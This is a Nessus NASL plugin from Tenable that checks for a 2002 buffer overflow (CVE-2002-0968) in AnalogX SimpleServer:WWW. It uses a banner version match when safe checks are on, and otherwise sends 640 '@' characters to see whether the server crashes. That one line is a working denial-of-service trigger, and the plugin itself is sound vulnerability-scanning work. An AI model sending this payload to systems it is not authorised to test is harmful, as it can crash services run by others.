#
# (C) Tenable Network Security, Inc.
#

# Rerefence:
# To: bugtraq@securityfocus.com
# From:"Fort _" <fort@linuxmail.org>
# Subject: Remote DoS in AnalogX SimpleServer:www 1.16
# Message-ID: <20020613122121.31625.qmail@mail.securityfocus.com>

include("compat.inc");

if(description)
{
 script_id(11035);
 script_version("$Revision: 1.25 $");

 script_cve_id("CVE-2002-0968");
 script_bugtraq_id(5006);
 script_osvdb_id(3780);

 script_name(english:"AnalogX SimpleServer:WWW Buffer Overflow");
 script_summary(english:"Crashes SimpleServer:WWW");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote web server is vulnerable to a buffer overflow attack."
 );
 script_set_attribute( attribute:"description", value:
"The remote installation of AnalogX SimpleServer:WWW is affected by a
buffer overflow triggered when processing input, such as a series of
640 '@' characters.  An unauthenticated, remote attacker can leverage
this issue to crash the affected service or even to execute arbitrary
code on the remote host." );
 script_set_attribute(attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2002/Jun/112"
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2002/Jul/13"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Upgrade to version 1.23 or later as that reportedly fixes the issue."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/06/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/06/13");
 script_cvs_date("$Date: 2016/11/17 15:28:26 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/simpleserver");
 exit(0);
}

# The script code starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

banner = get_http_banner(port: port);
if (! banner) exit(0);

if (!egrep(pattern:"^Server: *SimpleServer:WWW/", string:banner)) exit(0);


if (safe_checks())
{
  if (egrep(pattern:"^Server: *SimpleServer:WWW/1.[01]([^0-9]|$)", string:banner))
  {
    server = strstr(banner, "Server:");
    server = server - strstr(server, '\r\n');

    report = string(
      "\n",
      "Nessus made this determination based on the version in the following\n",
      "Server response header :\n",
      "\n",
      "  ", server, "\n"
    );
    security_hole(port:port, extra:report);
  }
  exit(0);
}

if (http_is_dead(port: port)) exit(1, "The web server is dead");

w = http_send_recv_buf(port: port, 
  data:string(crap(length:640, data:"@"), "\r\n\r\n"));

if (http_is_dead(port: port)) security_hole(port);
